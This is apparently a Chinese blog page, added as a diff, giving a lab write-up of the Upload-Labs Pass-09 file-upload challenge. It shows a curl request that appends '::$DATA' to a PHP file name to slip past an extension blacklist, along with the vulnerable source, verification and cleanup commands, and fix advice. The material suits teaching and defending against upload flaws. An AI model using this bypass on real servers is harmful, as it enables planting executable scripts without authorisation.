@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-09 ::$DATA 扩展名绕过 Writeup - gz2008的技术博客</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    h3 { margin-top: 24px; color: #334155; font-size: 1.05rem; }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+
+    <h1>Upload-Labs Pass-09：<code>::$DATA</code> 扩展名绕过</h1>
+    <div class="tags">
+      <span class="tag"># Upload-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># File Upload</span>
+      <span class="tag"># ::$DATA</span>
+      <span class="tag"># Windows ADS</span>
+    </div>
+
+    <p>Pass-09 仍然使用扩展名黑名单。由于服务端只把最后一个点之后的文本取出来检查，文件名追加 <code>::$DATA</code> 后，检查值是 <code>.php::$data</code>，不会命中黑名单里的 <code>.php</code>。本文记录请求构造、源码根因、Linux 实测结果和精确清理过程。</p>
+
+    <h2>一、实验信息</h2>
+    <table>
+      <tr><th>项目</th><th>内容</th></tr>
+      <tr><td>靶场</td><td>Upload-Labs</td></tr>
+      <tr><td>关卡</td><td>Pass-09</td></tr>
+      <tr><td>目标</td><td><code>http://127.0.0.1:8081/Pass-09/index.php</code></td></tr>
+      <tr><td>漏洞类型</td><td>扩展名黑名单与平台路径语义不一致</td></tr>
+      <tr><td>绕过后缀</td><td><code>::$DATA</code></td></tr>
+      <tr><td>验证文件</td><td>只输出固定文本的无副作用 PHP 探针</td></tr>
+      <tr><td>运行环境</td><td>Linux / WSL、PHP 8.4 内置服务器、ext2/ext3 文件系统</td></tr>
+      <tr><td>验证结果</td><td>黑名单绕过并成功落盘；Linux 下返回 PHP 源码，未确认代码执行</td></tr>
+    </table>
+
+    <h2>二、请求观察</h2>
+    <p>表单文件字段名为 <code>upload_file</code>。下面的 Burp 截图保留了 Pass-09 页面、请求中的文件名和响应页面。文件名以 <code>.php::$DATA</code> 结尾，响应页已经生成了指向上传目录的图片标签：</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass09_request.png" alt="Burp Repeater 中给 Pass-09 文件名追加 ::$DATA 并收到上传响应">
+      <figcaption>请求文件名使用 <code>一句话木马.php::$DATA</code>；响应页出现上传文件的图片框。</figcaption>
+    </figure>
+
+    <div class="note">图片框出现只能证明上传流程返回了文件路径，不能单独证明 PHP 执行。还要检查实际落盘文件名、HTTP 响应内容以及代码是否真的运行。</div>
+
+    <h2>三、构造复现请求</h2>
+    <p>为了让验证不包含可执行命令，准备一个只输出固定标记的探针：</p>
+
+    <pre><code>&lt;?php echo "PASS09_FILTER_BYPASS_OK"; ?&gt;</code></pre>
+
+    <p>使用 curl 发送 multipart 请求，并在 <code>filename=</code> 后追加 <code>::$DATA</code>：</p>
+
+    <pre><code>curl.exe -sS -i \
+  -F 'upload_file=@pass09_probe.php;filename=pass09_probe.php::$DATA' \
+  -F 'submit=上传' \
+  http://127.0.0.1:8081/Pass-09/index.php</code></pre>
+
+    <p>本次请求返回 <code>200 OK</code>，响应 HTML 中生成：</p>
+
+    <pre><code>&lt;img src="../upload/202610290215553208.php::$data" width="250px" /&gt;</code></pre>
+
+    <p><code>$is_upload</code> 只有在 <code>move_uploaded_file()</code> 成功后才会变为真，所以生成这个标签说明校验已放行，文件也已写入上传目录。</p>
+
+    <h2>四、漏洞定位</h2>
+    <p>Pass-09 的核心逻辑可以简化为：</p>
+
+    <pre><code>$deny_ext = array(".php", ".php5", ".phtml", ...);
+$file_name = trim($_FILES['upload_file']['name']);
+$file_name = deldot($file_name);
+$file_ext = strrchr($file_name, '.');
+$file_ext = strtolower($file_ext);
+$file_ext = trim($file_ext);
+
+if (!in_array($file_ext, $deny_ext)) {
+    $img_path = UPLOAD_PATH.'/'
+              . date("YmdHis")
+              . rand(1000, 9999)
+              . $file_ext;
+    move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path);
+}</code></pre>
+
+    <p>对 <code>pass09_probe.php::$DATA</code> 的处理过程如下：</p>
+
+    <table>
+      <tr><th>阶段</th><th>结果</th></tr>
+      <tr><td><code>trim($file_name)</code></td><td>保留 <code>pass09_probe.php::$DATA</code></td></tr>
+      <tr><td><code>deldot()</code></td><td>只处理末尾点号，对当前后缀无影响</td></tr>
+      <tr><td><code>strrchr($file_name, '.')</code></td><td>得到 <code>.php::$DATA</code></td></tr>
+      <tr><td><code>strtolower()</code></td><td>得到 <code>.php::$data</code></td></tr>
+      <tr><td><code>trim()</code></td><td>仍为 <code>.php::$data</code></td></tr>
+      <tr><td><code>in_array()</code></td><td>不等于 <code>.php</code>，黑名单放行</td></tr>
+      <tr><td><code>move_uploaded_file()</code></td><td>以随机名加 <code>.php::$data</code> 保存</td></tr>
+    </table>
+
+    <p>根因是安全判断只理解普通文件名，而实际文件路径还可能被操作系统解释为带有数据流语法的名称。判断值 <code>.php::$data</code> 与用户想使用的 <code>.php</code> 语义不一致，黑名单因此失效。</p>
+
+    <h2>五、落盘与访问验证</h2>
+    <p>检查服务端实际生成的文件：</p>
+
+    <pre><code>stat --printf='name=%n\nsize=%s\nmode=%A\n' \
+  '/home/ctf/labs/upload-labs/upload/202610290215553208.php::$data'</code></pre>
+
+    <p>文件大小为 41 字节，权限为普通可读文件。随后请求对应 URL：</p>
+
+    <pre><code>curl.exe -sS -i \
+  'http://127.0.0.1:8081/upload/202610290215553208.php::$data'</code></pre>
+
+    <p>响应状态为 <code>200 OK</code>，响应正文是：</p>
+
+    <pre><code>&lt;?php echo "PASS09_FILTER_BYPASS_OK"; ?&gt;</code></pre>
+
+    <p>返回的是 PHP 源码，而不是 <code>PASS09_FILTER_BYPASS_OK</code>，说明当前 PHP 内置服务器没有把这个 Linux 文件名识别为可执行的 <code>.php</code> 脚本。因此本机可以确认：</p>
+
+    <ul>
+      <li><code>::$DATA</code> 已绕过 Pass-09 的扩展名黑名单。</li>
+      <li>文件已成功写入 Web 可访问的 <code>upload/</code> 目录。</li>
+      <li>文件可以直接通过 HTTP 读取。</li>
+      <li>Linux/WSL 环境中的代码执行未确认。</li>
+    </ul>
+
+    <h2>六、Windows ADS 场景的边界</h2>
+    <p>经典 Upload-Labs 常运行在 Windows 环境。<code>:$DATA</code> 是 NTFS 数据流语法的一部分；在某些 Win32 路径处理组合下，<code>file.php::$DATA</code> 会解析到 <code>file.php</code> 的默认数据流，从而让 Web 服务器最终按 <code>.php</code> 处理。</p>
+
+    <table>
+      <tr><th>环境</th><th>文件路径行为</th><th>本次验证</th></tr>
+      <tr><td>Linux / WSL</td><td><code>:$DATA</code> 只是文件名中的普通字符</td><td><code>.php::$data</code> 原样落盘，返回源码</td></tr>
+      <tr><td>Windows / NTFS</td><td>可能解析为文件默认数据流，最终映射到 <code>.php</code></td><td>本次未在 Windows 靶场验证，不宣称已获得 RCE</td></tr>
+    </table>
+
+    <div class="note">不能把“黑名单绕过成功”和“WebShell 已执行”混为一谈。本文在 Linux 上只验证了绕过、落盘和 HTTP 可读；Windows 下的脚本执行属于平台相关推断。</div>
+
+    <h2>七、清理上传文件</h2>
+    <p>实验结束后按完整随机文件名删除探针；原有测试木马也使用同样的精确路径清理：</p>
+
+    <pre><code>rm -- \
+  '/home/ctf/labs/upload-labs/upload/202610290213408985.php::$data' \
+  '/home/ctf/labs/upload-labs/upload/202610290215553208.php::$data'</code></pre>
+
+    <p>删除后再次请求两个 URL 均返回 <code>404 Not Found</code>，而目录自带的 <code>readme.php</code> 仍返回 <code>200 OK</code>。这说明清理只命中本次测试文件，没有使用批量删除或“清空上传文件”按钮。</p>
+
+    <div class="success">最终状态：Pass-09 的黑名单绕过已被复现；两个上传文件均已删除并验证为 404；Linux 环境下没有执行或保留命令执行型 WebShell。</div>
+
+    <h2>八、修复建议</h2>
+    <ul>
+      <li>不要用扩展名黑名单作为安全边界，改用服务端扩展名白名单。</li>
+      <li>忽略客户端文件名，由服务端生成随机文件名和固定安全扩展名。</li>
+      <li>在保存前拒绝冒号、数据流标记、路径分隔符、尾随点号和尾随空格等平台特殊字符。</li>
+      <li>同时检查 MIME、文件头和实际文件内容；图片应重新解码并编码。</li>
+      <li>将上传目录移出 Web 根目录，或在 Web 服务器层禁止该目录执行脚本。</li>
+    </ul>
+
+    <h2>九、复盘</h2>
+    <p>Pass-09 利用的是“PHP 看到的后缀”和“操作系统理解的路径”之间的差异。Linux 把这串字符当成普通文件名，Windows/NTFS 则可能赋予 <code>::$DATA</code> 特殊语义。正确的实验结论必须区分校验绕过、成功落盘、HTTP 访问和代码执行四个阶段，并以实际平台结果为准。</p>
+  </main>
+</body>
+</html>
